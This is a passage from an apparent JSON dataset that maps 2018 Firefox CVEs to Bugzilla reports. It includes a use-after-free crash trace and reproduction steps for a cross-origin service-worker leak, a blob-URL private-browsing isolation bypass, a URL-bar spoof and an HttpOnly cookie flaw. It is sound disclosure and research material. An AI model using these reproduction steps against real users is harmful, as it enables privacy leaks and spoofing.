js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #11 0x7f7e75cf054c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #12 0x7f7e75cf1072 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #13 0x7f7e767ec5ec in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2995:12 #14 0x7f7e6ea8070e in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #15 0x7f7e6f646fd3 in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #16 0x7f7e6f646fd3 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #17 0x7f7e6f60d901 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1111:51 #18 0x7f7e6f60f812 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:20 #19 0x7f7e6f5fa1ff in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:462:16 #20 0x7f7e6f5fdaeb in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:826:9 #21 0x7f7e71bf6491 in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1070:7 #22 0x7f7e74f6d2c2 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7907:21 #23 0x7f7e74f691ea in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7700:7 #24 0x7f7e74f70fef in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #25 0x7f7e6bdf7c77 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1319:3 #26 0x7f7e6bdf6e81 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:862:14 #27 0x7f7e6bdf3b14 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:751:9 #28 0x7f7e6bdf5b4c in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:633:5 #29 0x7f7e6bdf6a6c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp #30 0x7f7e6a0b840a in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:629:28 #31 0x7f7e6d0de377 in DoUnblockOnload /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:9118:18 #32 0x7f7e6d0de377 in nsDocument::UnblockOnload(bool) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:9040 #33 0x7f7e6d0ba50a in nsDocument::DispatchContentLoadedEvents() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5680:3 #34 0x7f7e6d1393f4 in applyImpl<nsDocument, void (nsDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1142:12 #35 0x7f7e6d1393f4 in apply<nsDocument, void (nsDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1148 #36 0x7f7e6d1393f4 in mozilla::detail::RunnableMethodImpl<nsDocument*, void (nsDocument::*)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1192 #37 0x7f7e69ecab94 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:396:25 #38 0x7f7e69ef147e in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1033:14 #39 0x7f7e69f0cde0 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:508:10 #40 0x7f7e6ad942ba in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #41 0x7f7e6aceb249 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #42 0x7f7e6aceb249 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #43 0x7f7e6aceb249 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #44 0x7f7e712e79aa in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #45 0x7f7e75a2202b in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:875:22 #46 0x7f7e6aceb249 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #47 0x7f7e6aceb249 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #48 0x7f7e6aceb249 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #49 0x7f7e75a21a1d in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:701:34 #50 0x4ee965 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:63:30 #51 0x4ee965 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #52 0x7f7e88f6582f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #53 0x41dfe8 in _start (/fuzzer3/firefox/firefox+0x41dfe8) 0x608000076920 is located 0 bytes inside of 88-byte region [0x608000076920,0x608000076978) freed by thread T0 (file:// Content) here: #0 0x4bea42 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:68:3 #1 0x7f7e716e2fc6 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/gfxUserFontSet.h:184:5 #2 0x7f7e716e2fc6 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:41 #3 0x7f7e716e2fc6 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:398 #4 0x7f7e716e2fc6 in assign_assuming_AddRef /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:66 #5 0x7f7e716e2fc6 in operator= /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:168 #6 0x7f7e716e2fc6 in ImplCycleCollectionUnlink<mozilla::dom::FontFaceSet::UserFontSet> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:423 #7 0x7f7e716e2fc6 in mozilla::dom::FontFaceSet::cycleCollection::Unlink(void*) /builds/worker/workspace/build/src/layout/style/FontFaceSet.cpp:93 #8 0x7f7e69d81454 in nsCycleCollector::CollectWhite() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3396:26 #9 0x7f7e69d8418d in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3764:24 #10 0x7f7e69d87dd0 in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4310:21 #11 0x7f7e6d1ce61c in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1505:3 #12 0x7f7e6ccedbcb in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1449:3 #13 0x7f7e69f1d3b1 in NS_InvokeByIndex /builds/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:106 #14 0x7f7e6b90e2dd in Invoke /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1948:12 #15 0x7f7e6b90e2dd in Call /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1267 #16 0x7f7e6b90e2dd in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1234 #17 0x7f7e6b914b74 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:929:12 #18 0x7f7e75cf0014 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #19 0x7f7e75cf0014 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #20 0x7f7e75cd60f6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #21 0x7f7e75cd60f6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #22 0x7f7e75cc2860 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #23 0x7f7e75cf054c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #24 0x7f7e75cf1072 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #25 0x7f7e767ea171 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2936:12 #26 0x7f7e6b824e62 in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #27 0x7f7e75cf0014 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #28 0x7f7e75cf0014 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #29 0x7f7e75cd60f6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #30 0x7f7e75cd60f6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #31 0x7f7e75cc2860 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #32 0x7f7e75cf054c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #33 0x7f7e75cf1072 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #34 0x7f7e767ec5ec in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2995:12 #35 0x7f7e6ea8070e in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #36 0x7f7e6f646fd3 in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #37 0x7f7e6f646fd3 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #38 0x7f7e6f60d901 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1111:51 #39 0x7f7e6f60f812 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:20 #40 0x7f7e6f5fa1ff in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:462:16 #41 0x7f7e6f5fdaeb in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:826:9 #42 0x7f7e71bf6491 in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1070:7 previously allocated by thread T0 (file:// Content) here: #0 0x4bed83 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x4ef7ed in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:70:17 #2 0x7f7e716e3fc9 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:159:12 #3 0x7f7e716e3fc9 in mozilla::dom::FontFaceSet::FontFaceSet(nsPIDOMWindowInner*, nsIDocument*) /builds/worker/workspace/build/src/layout/style/FontFaceSet.cpp:158 #4 0x7f7e6d105c7f in nsIDocument::Fonts() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:13310:24 #5 0x7f7e6eafa608 in mozilla::dom::DocumentBinding::get_fonts(JSContext*, JS::Handle<JSObject*>, nsIDocument*, JSJitGetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/DocumentBinding.cpp:5700:63 #6 0x7f7e6f14c5a1 in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2911:13 #7 0x7f7e75cf0014 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #8 0x7f7e75cf0014 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #9 0x7f7e75cf2032 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #10 0x7f7e75cf2032 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541 #11 0x7f7e75cf2032 in js::CallGetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:656 #12 0x7f7e76d9a7cf in CallGetter /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2125:16 #13 0x7f7e76d9a7cf in GetExistingProperty<js::AllowGC::CanGC> /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2178 #14 0x7f7e76d9a7cf in NativeGetPropertyInline<js::AllowGC::CanGC> /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2381 #15 0x7f7e76d9a7cf in js::NativeGetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2417 #16 0x7f7e6f143b93 in mozilla::dom::GetPropertyOnPrototype(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, bool*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2098:10 #17 0x7f7e6ed0663c in mozilla::dom::HTMLDocumentBinding::DOMProxyHandler::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:2183:8 #18 0x7f7e76aae85e in getInternal /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:352:21 #19 0x7f7e76aae85e in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:362 #20 0x7f7e75cfb5ff in GetProperty /builds/worker/workspace/build/src/js/src/vm/NativeObject.h:1618:16 #21 0x7f7e75cfb5ff in GetProperty /builds/worker/workspace/build/src/js/src/jsobj.h:804 #22 0x7f7e75cfb5ff in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4405 #23 0x7f7e75ccfc81 in GetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:219:12 #24 0x7f7e75ccfc81 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2815 #25 0x7f7e75cc2860 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #26 0x7f7e75cf054c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #27 0x7f7e75cf1072 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #28 0x7f7e767ec5ec in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2995:12 #29 0x7f7e6ea8070e in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #30 0x7f7e6f646fd3 in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #31 0x7f7e6f646fd3 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #32 0x7f7e6f60d901 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1111:51 #33 0x7f7e6f60f812 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:20 #34 0x7f7e6f5fa1ff in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:462:16 #35 0x7f7e6f5fdaeb in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:826:9 #36 0x7f7e71bf6491 in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1070:7 #37 0x7f7e74f6d2c2 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7907:21 #38 0x7f7e74f691ea in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7700:7 #39 0x7f7e74f70fef in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #40 0x7f7e6bdf7c77 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1319:3 #41 0x7f7e6bdf6e81 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:862:14 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/gfx/thebes/gfxUserFontSet.cpp:560:41 in gfxUserFontEntry::DoLoadNextSrc(bool) Shadow bytes around the buggy address: 0x0c1080006cd0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 05 fa 0x0c1080006ce0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa 0x0c1080006cf0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa 0x0c1080006d00: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c1080006d10: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa =>0x0c1080006d20: fa fa fa fa[fd]fd fd fd fd fd fd fd fd fd fd fa 0x0c1080006d30: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c1080006d40: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1080006d50: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa 0x0c1080006d60: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa 0x0c1080006d70: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==18235==ABORTING"
      }
    ],
    "CVE-2018-5106": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1408708",
        "title": "Developer tool's traffic routes through service worker",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 Steps to reproduce: 1. Go to https://vuln.shhnjk.com/swnav.html 2. Now go to https://vuln.shhnjk.com/iframer.php?url=//www.bing.com/images/search?q=Edge 3. Open developer tools and click on any error. Actual results: Resources required to show error details are fetched through service worker registered on https://vuln.shhnjk.com/swnav.html. Leaking cross-origin information. Attaching PoC video since it might be difficult to repro. Expected results: Developer tool's traffic should not go thought service worker."
      }
    ],
    "CVE-2018-5108": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1421099",
        "title": "blob URLs do not respect OriginAttributes segregation",
        "description": "STR: 1. in a normal tab, open a page with this code: var b = new Blob([\"<script>var a = new BroadcastChannel('b'); a.onmessage = e => { alert(e.data); }</\" + \"script>\"], { type: 'text/html' }); var u = URL.createObjectURL(b); console.log(u); 2. open a private browsing window with the blobURL shown in the web console. 3. in the web console for the normal tab do: var a = new BroadcastChannel('b'); a.postMessage(42); Expected result: First of all, a blob URL generated on a normal tab should not be accessible from a private browsing tab. Additionally, it should not be able to receive messages from the normal tab. Note that this is not a bug in BroadcastChannel, but it's related on how we treat blob URLs. This test works on any OriginAttributes segregation: containers, first party isolation and so on. We should probably revisit the idea of keeping the principal together with a blob URL, via nsIURIWthPrincipal."
      }
    ],
    "CVE-2018-5110": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1423275",
        "title": "Switching mouse cursor from none to image hides the cursor globally on OSX",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Steps to reproduce: There is a jsFiddle here: https://jsfiddle.net/vb1ojdaL/ Summarizing here; on OSX El Capitan using Firefox 58 (and developer edition) when you have an element with `cursor: none` set and you toggle (via JS) it back to an image based cursor (base64 encoded) when there is another fallback cursor available the mouse cursor will become entirely invisible across all tabs/areas of firefox until you mouse over certain system areas (not sure exactly which cause it to reset). I have tested with a GIF and PNG that both appear to function correctly in chrome and on firefox in windows and both are broken on OSX. Here is the rule I initially discovered this bug with: cursor:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAKlBMVEUAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMjZDADAAAADXRSTlMAYJ/vML9AEN/PUCBwo5BZ4wAAAGZJREFUKM9jQAFL1VH5jFctC1AEZBWcp6MouMTAYoQssAXIC0VWcNFZgekWsgm9Ika6AsgmMF10vohiBYOuCIoCBgaO26gKGHTRFDBdHFXAgK6A4RpUAUIATQHDnTRUBQx376IqAAB3TCfI3I+0DAAAAABJRU5ErkJggg==) 0 31,crosshair; Actual results: The mouse cursor becomes invisible across the entire page (and all tabs of firefox. Expected results: I would have expected the cursor to be visible as it is on other browsers/operating systems."
      }
    ],
    "CVE-2018-5111": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1321619",
        "title": "URL bar spoof using drag and drop (dnd) and unicode-lookalike protocol to drag plaintext that \"looks like\" a valid URL",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36 Steps to reproduce: hey, there's a url bar spoof vulnerability that occurs when a specially crafted url is dragged into the address bar. Steps to reproduce: 1. Open poc.html(attached). 2. Drag and Drop the text in the page into the address bar. 3. notice that now is shown \"https://www.google.com\", even though the page hasn't been loaded. cheers, Mario."
      }
    ],
    "CVE-2018-5114": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1421324",
        "title": "Overwrite of existing cookie with HttpOnly flagged cookie results in HttpOnly being ignored by Firefox",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Steps to reproduce: A HTTP Request is sent to the server (192.168.1.1), which responds with with a Set-Cookie (without HttpOnly flag) statement to set a cookie: Example Response: HTTP/1.1 302 Found Content-Type: text/html Content-Length: 287 Location: http://192.168.1.1/webpage.php?id=1 Connection: close Set-Cookie: PHPSESSID=qevb2lkbjviniu2i3ie278tp45; path=/ <...> The cookie PHPSESSID is set in Firefox, and the Browser follows the Location redirect to the webpage (same server 192.168.1.1) issuing the following request: GET /webpage.php?id=1 HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Referer: http://192.168.1.1/login.php Cookie: PHPSESSID=qevb2lkbjviniu2i3ie278tp45 DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 This request results in the following response from the server setting a HttpOnly protected 